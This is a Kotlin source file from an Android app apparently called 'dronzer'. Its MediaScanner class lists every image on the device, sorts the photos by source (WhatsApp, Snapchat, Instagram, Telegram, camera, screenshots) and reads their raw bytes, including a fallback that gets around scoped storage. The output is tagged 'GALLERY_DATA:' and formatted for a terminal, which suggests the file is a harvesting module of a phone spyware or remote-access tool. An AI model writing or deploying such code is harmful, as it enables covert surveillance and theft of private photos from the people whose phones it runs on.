package com.example.dronzer

import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import java.io.File

class MediaScanner {
    companion object {
        fun getMediaList(context: Context): String {
            val result = StringBuilder("\u001b[1;35m--- Gallery Scan ---\u001b[0m\n")
            val projection = arrayOf(
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
                MediaStore.Images.Media._ID
            )
            
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC"
            )

            cursor?.use {
                val dataIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val bucketIndex = it.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                
                while (it.moveToNext()) {
                    try {
                        val path = it.getString(dataIndex)
                        val bucket = it.getString(bucketIndex) ?: "Unknown"
                        val category = categorize(bucket, path)
                        result.append("GALLERY_DATA: [$category] [$bucket] $path\n")
                    } catch (e: Exception) {}
                }
            }
            
            if (result.length < 30) return "\u001b[1;31m--- Gallery ---\u001b[0m\n(No images found)\n"
            return result.toString()
        }

        private fun categorize(bucket: String, path: String): String {
            val lp = path.lowercase()
            val lb = bucket.lowercase()
            return when {
                lb.contains("camera") || lp.contains("dcim/camera") -> "Camera"
                lb.contains("whatsapp") || lp.contains("com.whatsapp") -> "WhatsApp"
                lb.contains("snapchat") || lp.contains("snapchat") -> "Snapchat"
                lb.contains("screenshot") || lp.contains("screenshots") -> "Screenshots"
                lb.contains("instagram") || lp.contains("instagram") -> "Instagram"
                lb.contains("telegram") || lp.contains("telegram") -> "Telegram"
                lb.contains("facebook") || lp.contains("facebook") -> "Facebook"
                lb.contains("download") || lp.contains("download") -> "Downloads"
                lp.contains("dcim") -> "DCIM"
                else -> "Other"
            }
        }

        fun getImageBytes(context: Context, path: String): ByteArray? {
            return try {
                // Try direct file access first
                val file = File(path)
                if (file.exists() && file.canRead()) {
                    return file.readBytes()
                }

                // Fallback to ContentResolver for Scoped Storage (WhatsApp/Instagram)
                val uri = getUriFromPath(context, path)
                if (uri != null) {
                    context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                } else null
            } catch (e: Exception) {
                null
            }
        }

        private fun getUriFromPath(context: Context, path: String): Uri? {
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID),
                MediaStore.Images.Media.DATA + "=?",
                arrayOf(path),
                null
            )
            return cursor?.use {
                if (it.moveToFirst()) {
                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString())
                } else null
            }
        }
    }
}
